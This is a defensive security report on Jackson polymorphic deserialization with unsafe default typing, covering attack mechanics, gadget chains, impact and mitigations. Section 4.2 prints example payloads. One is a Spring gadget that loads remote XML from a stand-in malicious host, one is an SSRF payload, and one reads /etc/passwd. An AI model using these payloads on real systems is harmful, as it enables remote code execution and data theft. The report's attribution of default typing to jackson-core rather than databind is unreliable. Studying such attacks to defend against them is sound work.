## Deep Analysis: Polymorphic Deserialization with Unsafe Default Typing in Jackson-core

### 1. Define Objective of Deep Analysis

**Objective:** To thoroughly analyze the "Polymorphic Deserialization with Unsafe Default Typing" attack surface in applications using Jackson-core, focusing on the technical details, potential impact, exploitation methods, and effective mitigation strategies. This analysis aims to provide development teams with a comprehensive understanding of the risks associated with insecure default typing and actionable recommendations to secure their applications.

### 2. Scope

**Scope:** This deep analysis is specifically focused on the following aspects:

*   **Component:** Jackson-core library (https://github.com/fasterxml/jackson-core) and its role in polymorphic deserialization.
*   **Attack Surface:** Polymorphic deserialization vulnerabilities arising from insecurely configured default typing in Jackson.
*   **Vulnerability Mechanism:** How attackers can manipulate JSON payloads to inject malicious class names and trigger unintended deserialization of arbitrary classes.
*   **Impact:** Potential security consequences, including Remote Code Execution (RCE), Arbitrary File System Access, and Server-Side Request Forgery (SSRF).
*   **Mitigation Strategies:** Evaluation of recommended mitigation techniques and their effectiveness.

**Out of Scope:**

*   Other Jackson modules (databind, annotations) unless directly relevant to the core deserialization process and default typing.
*   Vulnerabilities unrelated to polymorphic deserialization and default typing in Jackson.
*   Specific application logic vulnerabilities beyond the scope of Jackson's deserialization process.
*   Detailed code review of specific applications using Jackson.

### 3. Methodology

**Methodology:** This deep analysis will employ the following methodology:

1.  **Information Gathering:** Review the provided attack surface description, Jackson documentation related to polymorphic deserialization and default typing, and relevant security advisories and research papers.
2.  **Technical Analysis:**
    *   **Mechanism Breakdown:** Deconstruct the technical process of polymorphic deserialization in Jackson-core when default typing is enabled.
    *   **Exploitation Vector Analysis:**  Examine how attackers craft malicious JSON payloads to exploit this vulnerability.
    *   **Gadget Chain Research:** Investigate known gadget chains (e.g., `org.springframework.context.support.ClassPathXmlApplicationContext`) and potential new gadgets that can be triggered through polymorphic deserialization.
    *   **Impact Assessment:**  Analyze the potential consequences of successful exploitation, focusing on RCE, File System Access, and SSRF scenarios.
3.  **Mitigation Strategy Evaluation:**
    *   **Effectiveness Analysis:** Assess the effectiveness of each recommended mitigation strategy (disabling default typing, restricted typing, explicit type information).
    *   **Implementation Guidance:** Provide practical guidance on how to implement these mitigations correctly in Jackson configurations.
    *   **Limitations and Bypass Considerations:**  Explore potential limitations or bypasses of the proposed mitigations.
4.  **Documentation and Reporting:**  Compile the findings into a comprehensive report (this document) with clear explanations, examples, and actionable recommendations for development teams.

---

### 4. Deep Analysis of Attack Surface: Polymorphic Deserialization with Unsafe Default Typing

#### 4.1. Technical Deep Dive: How Polymorphic Deserialization and Default Typing Enable the Attack

Jackson-core, at its heart, is responsible for parsing JSON and converting it into Java objects (deserialization). Polymorphic deserialization is a powerful feature that allows Jackson to deserialize JSON into different Java classes based on type information embedded within the JSON itself. This is crucial for handling inheritance and polymorphism in object-oriented programming.

**Default Typing:**  To enable polymorphic deserialization, Jackson needs to know *which* Java class to instantiate when deserializing a JSON object.  Default typing is a configuration option in Jackson that instructs the `ObjectMapper` to *automatically* include type information in the JSON during serialization and *interpret* this type information during deserialization, even when no explicit type information is present in the Java code or annotations.

**Insecure Default Typing Configuration:** The vulnerability arises when default typing is enabled *without proper restrictions*.  Specifically, if Jackson is configured to use a `PolymorphicTypeValidator` that is too permissive (or no validator at all, which is the default behavior in older versions or when explicitly configured insecurely), it becomes vulnerable.

**Mechanism of Exploitation:**

1.  **Type Hint Injection:** When default typing is enabled, Jackson looks for type hints in the JSON. By default, it uses the `@class` property (or `@type` depending on configuration). An attacker can inject this `@class` property into the JSON payload and specify an *arbitrary* fully qualified class name.

2.  **Class Instantiation:** During deserialization, Jackson-core reads the `@class` property and attempts to instantiate the Java class specified by the attacker.  Crucially, if no secure `PolymorphicTypeValidator` is in place, Jackson will attempt to instantiate *any* class provided in the `@class` hint, as long as it's available on the classpath.

3.  **Gadget Chain Triggering (RCE):**  The attacker doesn't just need to instantiate *any* class; they need to instantiate a class that, when instantiated and potentially manipulated with other JSON properties, leads to a harmful action. This is where "gadget chains" come into play. Gadget chains are sequences of Java classes and methods that, when invoked in a specific order, can achieve arbitrary code execution.  Well-known gadget chains exist in common Java libraries like Spring, Commons Collections, and others.  Attackers leverage these chains by specifying the initial class of the chain in the `@class` property.

4.  **Exploiting Deserialization Side Effects (SSRF, File Access):** Even without full RCE gadget chains, instantiating certain classes can have immediate side effects. For example, instantiating `java.net.URL` with a malicious URL can trigger a Server-Side Request Forgery (SSRF) when the `URL` object is processed by the application. Similarly, instantiating classes related to file system operations could lead to arbitrary file access.

**Jackson-core's Role:** Jackson-core is the engine that performs the deserialization and handles the interpretation of type hints. It provides the configuration options for default typing and the `PolymorphicTypeValidator` interface.  The vulnerability is directly tied to how Jackson-core is configured and how it processes the `@class` hint.  While Jackson-core itself is not inherently vulnerable, *insecure configuration* of default typing within Jackson-core directly enables this attack surface.

#### 4.2. Attack Vectors and Scenarios

Beyond the example provided (`java.net.URL`, `org.springframework.context.support.ClassPathXmlApplicationContext`), numerous attack vectors and scenarios exist:

*   **Remote Code Execution (RCE) via Gadget Chains:** This is the most critical impact. Attackers can leverage various gadget chains depending on the libraries present in the application's classpath. Examples include:
    *   **Spring Framework Gadgets:**  `org.springframework.context.support.ClassPathXmlApplicationContext`, `org.springframework.context.support.FileSystemXmlApplicationContext` (as mentioned in the example). These can be used to load malicious XML configurations that execute arbitrary code.
    *   **Commons Collections Gadgets (Older Versions):**  Vulnerable versions of Apache Commons Collections have been widely exploited in deserialization attacks.
    *   **JNDI Injection Gadgets:** Classes that perform JNDI lookups can be exploited to retrieve and execute malicious code from remote servers.
    *   **Groovy/Beanshell/JavaScript Gadgets:** If scripting engines are on the classpath, classes related to these engines can be used to execute arbitrary scripts.

*   **Server-Side Request Forgery (SSRF):** Instantiating classes like `java.net.URL`, `java.net.URI`, or classes from HTTP client libraries (e.g., Apache HttpClient, OkHttp) with attacker-controlled URLs can lead to SSRF. This allows attackers to:
    *   Scan internal networks.
    *   Access internal services and APIs.
    *   Potentially exfiltrate data.

*   **Arbitrary File System Access:** Instantiating classes related to file operations (e.g., `java.io.File`, classes from file system libraries) could potentially allow attackers to:
    *   Read sensitive files from the server.
    *   Write files to arbitrary locations (depending on application permissions and class capabilities).
    *   Potentially delete files.

*   **Denial of Service (DoS):** While less severe than RCE, attackers might be able to cause DoS by:
    *   Instantiating classes that consume excessive resources (memory, CPU).
    *   Triggering exceptions that crash the application.

**Example Attack Payloads:**

*   **RCE (Spring):**
    ```json
    {
      "@class": "org.springframework.context.support.ClassPathXmlApplicationContext",
      "configLocation": "http://malicious.site/evil.xml"
    }
    ```

*   **SSRF:**
    ```json
    {
      "@class": "java.net.URL",
      "val": "http://attacker-controlled-server.com/internal-resource"
    }
    ```

*   **File System Access (Potential - depends on class and context):**
    ```json
    {
      "@class": "java.io.File",
      "path": "/etc/passwd"
    }
    ```

#### 4.3. Root Cause Analysis

The root cause of this vulnerability is **insecure configuration of default typing** in Jackson-core.  Specifically:

*   **Overly Permissive or Absent `PolymorphicTypeValidator`:**  The lack of a strong `PolymorphicTypeValidator` or using a weak validator like `LaissezFaireSubTypeValidator` allows Jackson to deserialize arbitrary classes specified in the `@class` hint.
*   **Default Behavior in Older Versions/Misconfiguration:**  Historically, Jackson's default behavior for default typing might have been less secure.  Even in newer versions, developers might misconfigure default typing without fully understanding the security implications.
*   **Design Choice of Type Hints in JSON:** While convenient for some use cases, the design decision to use type hints directly in the JSON payload (like `@class`) inherently creates a potential attack surface if not carefully controlled.

**Jackson-core's Responsibility:** Jackson-core provides the *feature* of default typing and the *mechanism* to control it through `PolymorphicTypeValidator`. However, it is the *developer's responsibility* to configure Jackson securely.  Jackson-core, in recent versions, has improved default security by requiring explicit enabling of default typing and providing tools like `PolymorphicTypeValidator`.

#### 4.4. Vulnerability Chaining

Polymorphic deserialization vulnerabilities are often *primitive* vulnerabilities. They are not directly exploitable on their own to achieve a specific business logic bypass. Instead, they are used as a stepping stone to trigger more severe vulnerabilities like RCE.

The "chaining" aspect is crucial:

1.  **Polymorphic Deserialization (Primitive):**  Allows controlled instantiation of arbitrary classes.
2.  **Gadget Chain (Secondary Vulnerability):**  Leverages the instantiated class (and potentially subsequent method calls during deserialization) to trigger a sequence of actions that ultimately lead to RCE or other high-impact consequences.

The effectiveness of this attack depends on the presence of suitable gadget chains in the application's classpath.  The more libraries an application includes, the higher the chance of finding exploitable gadget chains.

#### 4.5. Real-world Examples and Case Studies

While specific public case studies directly attributing breaches solely to Jackson polymorphic deserialization with default typing might be less explicitly documented in public reports (as root causes are often generalized), this vulnerability has been a significant factor in numerous security incidents.

*   **General Deserialization Vulnerabilities:**  The broader category of Java deserialization vulnerabilities, including those related to Jackson, has been widely exploited.  Many publicized breaches attributed to deserialization likely involved insecure polymorphic deserialization as a key component.
*   **Security Advisories and CVEs:**  While not always directly linked to "default typing," many CVEs related to Jackson deserialization vulnerabilities are rooted in the insecure handling of type information and class instantiation, which is the core of this attack surface. Searching for CVEs related to Jackson deserialization will reveal numerous instances where similar mechanisms have been exploited.
*   **Penetration Testing Findings:**  Security professionals routinely identify insecure default typing in Jackson configurations during penetration tests as a high-risk vulnerability.

#### 4.6. Defense in Depth Considerations

While mitigating default typing is paramount, a defense-in-depth approach is recommended:

*   **Input Validation and Sanitization:**  Even if default typing is disabled, robust input validation should be in place to prevent other types of injection attacks.
*   **Principle of Least Privilege:**  Run applications with the minimum necessary privileges to limit the impact of potential RCE or file system access vulnerabilities.
*   **Dependency Management and Security Audits:** Regularly audit application dependencies to identify and update vulnerable libraries, including Jackson and libraries containing known gadget chains.
*   **Web Application Firewall (WAF):**  A WAF can potentially detect and block malicious JSON payloads attempting to exploit deserialization vulnerabilities, although signature-based detection can be bypassed.
*   **Runtime Application Self-Protection (RASP):** RASP solutions can monitor application behavior at runtime and detect and prevent exploitation attempts, including deserialization attacks.
*   **Monitoring and Logging:** Implement comprehensive logging and monitoring to detect suspicious activity, including deserialization errors or attempts to access unusual classes.

#### 4.7. Limitations of Mitigations

While the recommended mitigations are effective, it's important to understand potential limitations:

*   **Whitelist Complexity (Restricted Typing):**  Creating and maintaining a secure whitelist of allowed classes for default typing is extremely challenging.  It's easy to overlook seemingly benign classes that can be exploited or introduce new vulnerabilities through transitive dependencies.  **Restricted typing should be approached with extreme caution and is generally not recommended unless absolutely necessary and implemented by security experts.**
*   **Bypasses in Complex Scenarios:**  In highly complex applications, there might be edge cases or less obvious ways to bypass even carefully configured `PolymorphicTypeValidator`s.
*   **Human Error:**  Misconfiguration or accidental re-enabling of default typing during development or deployment can reintroduce the vulnerability.

**Therefore, disabling default typing completely (`ObjectMapper.setDefaultTyping(null)`) remains the most robust and recommended mitigation strategy.**

### 5. Conclusion

The "Polymorphic Deserialization with Unsafe Default Typing" attack surface in Jackson-core represents a **critical security risk**.  Insecurely configured default typing allows attackers to inject malicious class names into JSON payloads, leading to severe consequences like Remote Code Execution, Server-Side Request Forgery, and Arbitrary File System Access.

**Key Takeaways and Recommendations:**

*   **Disable Default Typing:**  The most effective and strongly recommended mitigation is to **completely disable default typing** using `ObjectMapper.setDefaultTyping(null)`.
*   **Avoid `LaissezFaireSubTypeValidator`:** Never use `LaissezFaireSubTypeValidator` as it provides no security and effectively enables arbitrary class deserialization.
*   **Use Explicit Type Information:** Design APIs to rely on explicit type information using Jackson annotations like `@JsonTypeInfo` and `@JsonSubTypes` instead of default typing.
*   **If Restricted Typing is Absolutely Necessary (Use with Extreme Caution):**  If you must use default typing, implement a **highly restrictive and carefully vetted `PolymorphicTypeValidator`**.  Consult with security experts to design and implement this securely.
*   **Adopt Defense in Depth:** Implement layered security measures beyond just mitigating default typing, including input validation, dependency management, WAF/RASP, and monitoring.
*   **Educate Development Teams:** Ensure developers are aware of the risks associated with insecure deserialization and default typing in Jackson and are trained on secure configuration practices.

By understanding the technical details of this attack surface and implementing the recommended mitigations, development teams can significantly reduce the risk of exploitation and build more secure applications using Jackson-core.